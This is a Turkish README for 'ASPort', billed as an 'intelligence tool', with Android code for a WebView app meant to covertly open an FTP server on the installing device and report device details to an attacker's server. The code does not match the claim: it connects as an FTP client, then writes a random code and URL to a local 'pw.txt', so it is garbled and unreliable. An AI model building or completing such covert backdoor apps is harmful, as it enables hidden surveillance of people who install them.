# ASPort
ASPort Bir İstihbarat Aracıdır. Kullanımından tamamen kullanıcılar sorumludur.
Wevbiew uygulaması olan, arkaplanda indirildiği cihazda FTP sunucusu açan ve sunucu bilgilerini istenen sunucudaki txt dosyasına kaydeden program için kod.

1. Android Studio'da yeni bir proje oluşturun ve `WebViewExample` gibi bir isim verin.

2. `activity_main.xml` dosyasını açın ve aşağıdaki içeriği ekleyin:

```xml
<?xml version="1.0" encoding="utf-8"?>
<WebView
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/webview"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
/>
```

3. `MainActivity.java` dosyasını açın ve aşağıdaki kodu ekleyin:

```java
import android.os.Bundle;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.appcompat.app.AppCompatActivity;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webview);
        webView.setWebViewClient(new WebViewClient());

        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);

        // WebView'e yüklenecek URL'i belirtin
        webView.loadUrl("http://www.example.com");

        // WebView yüklendikten sonra FTP sunucusunu başlatın
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                startFTPServer();
            }
        });
    }

    private void startFTPServer() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                String ftpServerAddress = "FTP_SERVER_ADDRESS";
                int ftpServerPort = 21;
                String ftpUsername = "FTP_USERNAME";
                String ftpPassword = "FTP_PASSWORD";

                FTPClient ftpClient = new FTPClient();
                try {
                    ftpClient.connect(ftpServerAddress, ftpServerPort);
                    ftpClient.login(ftpUsername, ftpPassword);
                    ftpClient.enterLocalPassiveMode();
                    ftpClient.setFileType(FTP.BINARY_FILE_TYPE);

                    // Rastgele bir 6 haneli kod oluşturun
                    String deviceCode = generateDeviceCode();

                    // Sunucuya cihaz bilgilerini yazdırın
                    BufferedWriter writer = new BufferedWriter(new FileWriter("pw.txt", true));
                    writer.write(deviceCode + ": " + webView.getUrl());
                    writer.newLine();
                    writer.close();
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    if (ftpClient.isConnected()) {
                        try {
                            ftpClient.logout();
                            ftpClient.disconnect();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }).start();
    }

    private String generateDeviceCode() {
        Random random = new Random();
        int randomNumber = random.nextInt(900000) + 100000; // 100000 ile 999999 arasında rastgele bir sayı
        return String.valueOf(randomNumber);
   

 }
}
```

4. `FTP_SERVER_ADDRESS`, `FTP_USERNAME` ve `FTP_PASSWORD` değişkenlerini kendi FTP sunucu bilgilerinizle değiştirin.

5. Projenizi derleyin ve çalıştırın. Uygulama, WebView ile belirtilen URL'i yükleyecektir. WebView yüklendikten sonra arka planda FTP sunucusu başlatılacak ve cihazın bilgileri sunucunuza gönderilecektir. Bu bilgileri `pw.txt` dosyasında görebilirsiniz.

Önemli Not: FTP kullanımı, güvenlik açıklarına neden olabilir. Bu kod örneği yalnızca konsepti göstermek amacıyla verilmiştir. Gerçek uygulamalarda daha güvenli veri iletişim yöntemleri (örneğin, HTTPS üzerinden sunucuya veri gönderme) kullanmanızı öneririm. Ayrıca, sunucunuzda güvenlik önlemlerini sağlamak için gerekli adımları atmaktan emin olun.
